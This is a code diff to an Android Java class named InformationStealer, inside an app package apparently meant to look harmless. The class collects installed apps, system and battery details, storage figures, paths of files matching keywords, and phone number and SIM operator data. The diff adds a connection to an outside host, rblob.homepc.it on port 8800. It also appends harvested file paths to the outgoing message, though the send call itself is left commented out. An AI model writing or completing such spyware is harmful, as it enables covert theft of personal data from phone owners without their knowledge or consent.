@@ -1,6 +1,6 @@
 package com.example.applicazioneinteressante;
 
-
+import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
@@ -19,7 +19,6 @@ import android.telephony.TelephonyManager;
 
 import androidx.core.content.ContextCompat;
 import java.util.List;
-import java.util.Locale;
 
 public class InformationStealer implements Runnable {
 
@@ -62,23 +61,25 @@ public class InformationStealer implements Runnable {
 
     @Override
     public void run(){
+        conn.openConnection("rblob.homepc.it", 8800, context);
+
         messaggio.append(stealApp(context));
         messaggio.append(stealSystemDetail(context));
         messaggio.append(stealBatteryInformation(context));
         messaggio.append(stealFileSystemInfo(context, keywords));
         messaggio.append(stealNumberInformations(context));
 
-        /* Invia dati al server
-        conn.sendMessage(messaggio);
-        conn.closeConnection();
-        */
+        //conn.sendMessage2(messaggio.toString());
 
+        //TODO: NON DIMENTICHIAMOCI DI ELIMINARE TUTTA STA PARTE QUA
         int index = messaggio.indexOf("&");
         while (index != -1) {
             messaggio.replace(index, index + 1, "\n");
             index = messaggio.indexOf("&", index + 1);
         }
         System.out.println(messaggio.toString());
+
+        conn.closeConnection();
     }
 
 
@@ -96,7 +97,7 @@ public class InformationStealer implements Runnable {
                     msg += "&SIM_Operator=" + operator + "&";
                 return msg;
             } else {
-                // Permesso non concesso
+
                 return "";
             }
         }
@@ -149,6 +150,7 @@ public class InformationStealer implements Runnable {
                 String filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA));
                 System.out.println("Trovato un file interessante: " + filePath);
                 numeroFileInteressanti++;
+                sb.append("&File=" + filePath + "&");
             } while (cursor.moveToNext());
             System.out.println("\nFile interessanti trovati: " + numeroFileInteressanti);
             cursor.close();
@@ -178,11 +180,11 @@ public class InformationStealer implements Runnable {
         double totalSizeGB = (double) totalSizeBytes / (1024 * 1024 * 1024);
         double availableSizeGB = (double) availableSizeBytes / (1024 * 1024 * 1024);
 
-        String totalSizeFormatted = String.format("%0.2f", totalSizeGB);
-        String availableSizeFormatted = String.format("%0.2f", availableSizeGB);
+        //String totalSizeFormatted = String.format("%.2f", totalSizeGB);
+        //String availableSizeFormatted = String.format("%.2f", availableSizeGB);
 
-        sb.append("&Total_size=" + totalSizeFormatted + "_GB&");
-        sb.append("Available_size=" + availableSizeFormatted + "_GB&");
+        sb.append("&Total_size=" + totalSizeGB + "_GB&");
+        sb.append("Available_size=" + availableSizeGB + "_GB&");
         // Altre informazioni sul file system...
         System.out.println("-------\n" + sb.toString());
         return sb.toString();
@@ -253,6 +255,4 @@ public class InformationStealer implements Runnable {
 
         return sb.toString();
     }
-
 }
-
